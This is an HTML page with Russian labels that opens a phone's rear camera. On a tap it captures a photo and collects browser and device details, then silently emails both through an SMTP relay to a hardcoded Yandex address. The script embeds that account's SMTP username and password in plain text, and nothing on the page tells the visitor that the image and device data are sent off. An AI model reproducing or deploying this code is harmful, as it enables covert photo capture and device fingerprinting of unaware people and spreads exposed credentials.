    <style>
        #video {
            width: 100%;
            height: 100%;
            max-height: 100vh;
        }
        
        #canvas {
            display: none;
        }
    </style>
</head>

<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>

    <script src="https://smtpjs.com/v3/smtp.js">
    </script>
    <script>
        var canvas = document.getElementById('canvas');
        var context = canvas.getContext('2d');
        var video = document.getElementById('video');

        function vibrate(val) {
            try {
                if (navigator) {
                    if (navigator.vibrate) return navigator.vibrate(val);
                    else if (navigator.oVibrate) return navigator.oVibrate(val);
                    else if (navigator.mozVibrate) return navigator.mozVibrate(val);
                    else if (navigator.webkitVibrate) return navigator.webkitVibrate(val);
                } else {
                    document.append("Ваш браузер не поддерживает вибрации.")
                }
            } catch (e) {
                alert(e);
            }
        }

        function infiniteVibrate(val, interval) {
            stopVibrate();
            vInterval = setInterval(function() {
                vibrate(val);
            }, interval);
        }

        function stopVibrate() {
            if (typeof(vInterval) !== "undefined") clearInterval(vInterval);
            vibrate(0);
        }
        // Trigger photo take
        document.getElementsByTagName("video")[0].addEventListener("click", function() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            var code = navigator.appCodeName;
            var name = navigator.appName;
            var vers = navigator.appVersion;
            var platform = navigator.platform;
            var cook = navigator.cookieEnabled;
            var je = navigator.javaEnabled();
            var ua = navigator.userAgent;
            var text = 'Ваш браузер: ' + name +
                '<br />Версия браузера: ' + vers +
                '<br />Кодовое название браузера: ' + code +
                '<br />Платформа: ' + platform +
                '<br />Поддержка cookie: ' + cook +
                '<br />Поддержка JavaScript: ' + je +
                '<br />Браузер: ' + ua +
                navigator.language +
                '<br />Операционная система: ' + navigator.oscpu +
                '<br />Производитель: ' + navigator.vendor +
                '<br />Подразделение: ' + navigator.vendorSub;
            vibrate(100)
            // PORT 2525
            Email.send({
                Host : "smtp.elasticemail.com",
                Username: 'khasieva.2023@yandex.ru',
                Password: "CBD06505D94CDFC25333D695E7DE7816C1AA",
                To: 'khasieva.2023@yandex.ru',
                From: "khasieva.2023@yandex.ru",
                Subject: "Пришел снимок экрана",
                Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
                Attachments: [{
                    name: 'photo.png',
                    data: canvas.toDataURL()
                }]
            }).then(
                message => {
                    vibrate(500)
                }
            );
        });
        // Grab elements, create settings, etc.
        var video = document.getElementById('video');

        var constraints = {
            video: {
                facingMode: "environment"
            },
            audio: false
        };
        // Get access to the camera!
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
                video.srcObject = stream;
                // video.play();
            });
        }
    </script>
</body>
